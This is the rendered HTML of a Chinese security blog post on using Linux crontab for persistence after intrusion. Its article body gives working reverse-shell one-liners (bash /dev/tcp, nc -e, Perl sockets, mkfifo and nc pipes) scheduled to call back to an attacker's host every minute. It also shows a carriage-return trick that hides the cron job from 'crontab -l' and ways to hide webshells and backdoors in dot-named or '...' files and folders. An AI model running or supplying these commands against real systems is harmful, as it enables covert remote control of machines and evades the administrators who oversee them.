@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="纯净水@流云-自留地">
+    <link rel="shortcut icon" href="http://some.url/to/favicon.ico">
+    <title>计划任务-Adagio</title>
+    
+        
+            <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/academicons/1.8.6/css/academicons.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+        
+    
+    <link rel="stylesheet" href="/css/adagio.css">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<body>
+    <div class="container-fluid">
+    <nav class="nav">
+        <div class="collapse navbar-collapse" id="navbar-sm">
+            
+            
+            <div class="navbar-nav">
+                <a href="https://hexo.io" class="nav-item nav-link">Hexo</a>
+            </div>
+            
+            <div class="navbar-nav">
+                <a href="http://www.hanlindong.com" class="nav-item nav-link">Adagio's author</a>
+            </div>
+            
+        </div>
+    </nav>
+</div>
+
+<div class="d-flex d-md-none" style="width: 100%; background-color: #e9ecef">
+    
+    <div class="nav">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar-sm"
+            aria-expanded="false" aria-label="Toggle Navigation">
+            <i class="fas fa-bars fa-lg"></i>
+        </button>
+    </div>
+    
+    <nav class="navbar ml-auto">
+        <a class="navbar-brand" href="/">
+            
+            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
+            
+        </a>
+    </nav>
+</div>
+
+
+<div class="container d-none d-md-block my-navbar">
+    <nav class="navbar navbar-expand-sm navbar-light bg-transparent">
+        <a class="navbar-brand " href="/">
+            
+            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
+            
+        </a>
+        
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+                
+                <li class="nav-item pl-2 pr-2 ">
+                    <a class="nav-link" href="https://hexo.io">Hexo</a>
+                </li>
+                
+                <li class="nav-item pl-2 pr-2 ">
+                    <a class="nav-link" href="http://www.hanlindong.com">Adagio's author</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </nav>
+</div>
+
+
+
+
+    <div class="jumbotron jumbotron-fluid">
+    <div class="container">
+        
+        <h1 class="mt-4 article-title page-title">计划任务</h1>
+        
+        <p class="lead text-gray mt-3">By Anonymous; Published on 2019-07-11</p>
+        
+        <div class="tags">
+            <ul class="tag-list">
+                
+                <li class="tag-list-item">
+                    <a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a>
+                </li>
+                
+                <li class="tag-list-item">
+                    <a class="tag-list-link" href="/tags/计划任务/">计划任务</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</div>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-9 pt-2">
+                <div class="row">
+                    <div class="col-12">
+                        <main>
+                            <article class="article-text page-content"><p>计划任务<br>[TOC]</p>
+<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>linux 计划任务 结合 NC执行后门</p>
+<h2 id="查看crontab执行情况"><a href="#查看crontab执行情况" class="headerlink" title="查看crontab执行情况"></a>查看crontab执行情况</h2><p>查看其日志的方式</p>
+<pre><code>tail -f /var/log/cron 
+</code></pre><h2 id="crontab-命令"><a href="#crontab-命令" class="headerlink" title="crontab 命令"></a>crontab 命令</h2><pre><code>Usage:
+ crontab [options] file
+ crontab [options]
+ crontab -n [hostname]
+
+Options:
+ -u &lt;user&gt;  define user
+ -e         edit user&#39;s crontab
+ -l         list user&#39;s crontab
+ -r         delete user&#39;s crontab
+ -i         prompt before deleting
+ -n &lt;host&gt;  set host in cluster to run users&#39; crontabs
+ -c         get host in cluster to run users&#39; crontabs
+ -s         selinux context
+ -x &lt;mask&gt;  enable debugging
+
+Default operation is replace, per 1003.2
+</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><pre><code>[root@VM_0_2_centos ~]# cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+</code></pre><p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293"></p>
+<h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
+<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+</code></pre><h4 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h4><pre><code>参数    描述
+-c string    从string中读取命令并处理他们
+-r     启动限制性shell,限制用户在默认目录下活动
+-i    启动交互性shell,允许用户输入
+-s    从标准输入读取命令
+</code></pre><p>即启用交互式shell</p>
+<pre><code>linux shell下常用的文件描述符是：
+1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 
+2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 
+3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;
+</code></pre><p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438"></p>
+<p>在man bash 里面解释为<br><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712"></p>
+<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
+<h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
+<pre><code>*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
+</code></pre><p>以及段师傅的</p>
+<pre><code>/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
+</code></pre><p>别忘了重启</p>
+<pre><code>/etc/init.d/cron restart
+</code></pre><p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888"><br><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887"></p>
+<p>修改下软连接</p>
+<pre><code>ln -sf bash /bin/sh
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530"><br><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300"></p>
+<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
+<pre><code>从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度
+</code></pre><h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
+<pre><code>*/1 * * * * nc -e /bin/sh ip port
+</code></pre><p>别忘了重启</p>
+<pre><code>service crond restart
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892"></p>
+<pre><code>*/1 * * * * perl -e &#39;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
+<pre><code>(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -
+</code></pre><p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
+<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657"></p>
+<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112"></p>
+<h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><pre><code>mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
+<p>或者</p>
+<pre><code>mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136"></p>
+<h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
+<p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
+<pre><code>touch .webshell.php 创建名字为 .webshell.php 的文件
+mkdir .backdoor/ 创建名字为 .backdoor 的文件夹
+</code></pre><p>终极方法<br>在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。<br>是文件的话浏览器访问直接输 … 就行，目录同理。</p>
+<pre><code>touch … 创建名字为 … 的文件
+mkdir … 创建名字为 … 的文件夹
+
+</code></pre><h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>  <a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" target="_blank" rel="noopener">解决ubuntu-crontab反弹shell失败的问题</a></p>
+<p>   <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/" target="_blank" rel="noopener">Netcat without -e? No Problem!</a></p>
+</article>
+                        </main>
+                        
+                        
+                    </div>
+                </div>
+                <div class="row mt-5 mb-5">
+                    <div class="col-12">
+                        <div class="row">
+    <div class="col">
+        <nav aria-label="paginator" class="paginator">
+            <ul class="pagination d-none d-md-flex pagination-lg justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/07/18/Web渗透/漏洞学习/fastjson/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            fastjson 1.2.47 rce</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/"
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">XXE实例及应用3
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+            <ul class="pagination d-md-none justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/07/18/Web渗透/漏洞学习/fastjson/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            fastjson 1.2.47 rce</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/"
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">XXE实例及应用3
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <div id="vcomment"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="container pt-4 page-sidebar">
+                    
+                    <div class="row">
+    <div class="col">
+        <h6>APPLAUSE FOR ME</h6>
+        <div id="applause-easy"></div>
+    </div>
+</div>
+                    
+                    <hr class="row">
+                    <div class="row toc-container">
+                        <div class="col-12">
+                            <h6>NAVIGATION</h6>
+                            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#计划任务"><span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看crontab执行情况"><span class="toc-text">查看crontab执行情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab-命令"><span class="toc-text">crontab 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#配置文件"><span class="toc-text">配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用crontab-反弹shell"><span class="toc-text">利用crontab 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash-反弹shell"><span class="toc-text">bash 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#命令解析"><span class="toc-text">命令解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab-反弹-shell"><span class="toc-text">crontab 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash和dash在-bin-sh-使用中的区别-待续"><span class="toc-text">bash和dash在/bin/sh  使用中的区别-待续</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#隐藏计划任务"><span class="toc-text">隐藏计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-缺少-e-参数的解决方式"><span class="toc-text">nc 缺少 -e 参数的解决方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-tcp"><span class="toc-text">dev/tcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mknod-FIFO"><span class="toc-text">mknod FIFO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隐藏文件-文件夹"><span class="toc-text">隐藏文件/文件夹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隐藏"><span class="toc-text">隐藏</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+    <div class="jumbotron jumbotron-fluid mb-0">
+        <div class="container-fluid">
+            <div class="col text-center">
+                <div class="bottom-social">
+                    <div class="row">
+    <div class="col text-center">
+        <ul class="list-inline">
+            
+            <li class="list-inline-item">
+                
+                <a href="https://github.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.facebook.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.pinterest.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-pinterest-p fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.linkedin.com/in/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-linkedin-in fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+                </div>
+                <p class="copyright text-muted">
+                    Copyright &copy; 吾善养浩然气
+                    <br>
+                    Thanks for coming!
+                    <br>
+                    <a href="https://github.com/Hanlin-Dong/hexo-theme-adagio">Adagio</a> - A <a href="https://hexo.io">Hexo</a> theme made with love by
+                    <a href="http://www.hanlindong.com">Hanlin Dong</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    
+    
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.slim.min.js"></script>
+        <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdn.bootcss.com/font-awesome/5.9.0/js/all.min.js"></script>
+         
+            <script type="text/x-mathjax-config">
+                MathJax.Hub.Config({
+                    CommonHTML: { linebreaks: { automatic: true } },
+                    "HTML-CSS": { linebreaks: { automatic: true } },
+                    SVG: { linebreaks: { automatic: true } }
+                });
+            </script>
+            <script src='https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+        
+    
+
+
+<script src="/js/av.min.js"></script>
+<script src="/js/valine.min.js"></script>
+<script src="/js/applause-easy.js"></script>
+
+<script>
+$(document).ready(function() {
+    var a = new ApplauseEasy({
+        id: 'applause-easy',
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        img_src: "http://img.hanlindong.com/blog/site/clap.png",
+        img_width: "50px",
+        img_height: "50px"
+    })
+})
+</script>
+
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?123456789";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-11111111-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+    gtag('config', 'UA-11111111-1');
+</script>
+
+
+    
+    <script>
+    new Valine({
+        el: "#vcomment",
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        notify: false,
+        varify: false,
+        avatar: 'identicon',
+        placeholder: "",
+        recordIP: true
+    })
+</script>
+    
+</body>
+</html>
